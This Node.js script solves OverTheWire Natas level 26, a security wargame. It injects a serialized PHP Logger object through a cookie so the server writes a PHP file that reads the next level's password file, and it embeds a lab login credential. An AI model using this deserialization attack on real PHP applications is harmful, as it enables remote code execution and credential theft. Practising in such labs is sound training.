const http = require('http');

const hostname = 'natas26.natas.labs.overthewire.org';
const session_id = 'nickontheweb';

const options = {
  base: ({drawing = '', path = '/index.php'}) => ({
    auth: 'natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=${session_id}; drawing=${drawing}`,
    },
    hostname,
    path,
    port: 80,
  }),
  get: params => ({
    ...options.base(params),
    method: 'GET',
  }),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

const serialized = `
O:6:"Logger":2:{
  s:15:"\x00Logger\x00logFile";
  s:28:"img/natas26_nickontheweb.php";
  s:15:"\x00Logger\x00exitMsg";
  s:57:"Password: <?php include("/etc/natas_webpass/natas27"); ?>";
}`
  .replace(/\n/g, '')
  .replace(/  s/g, 's');

const encoded = Buffer.from(serialized).toString('base64');

get(options.get({drawing: encoded}))
  .then(() => get(options.get({path: '/img/natas26_nickontheweb.php'})))
  .then(body => {
    const wasAuthed = body.match(/Password/);

    wasAuthed ? console.log('Success!') : console.log('Failure!');
    if (!wasAuthed) return;

    const regex = /(Password: [a-zA-Z0-9]{32})/;
    const password = body.match(regex)[1];

    console.log(password);
  });
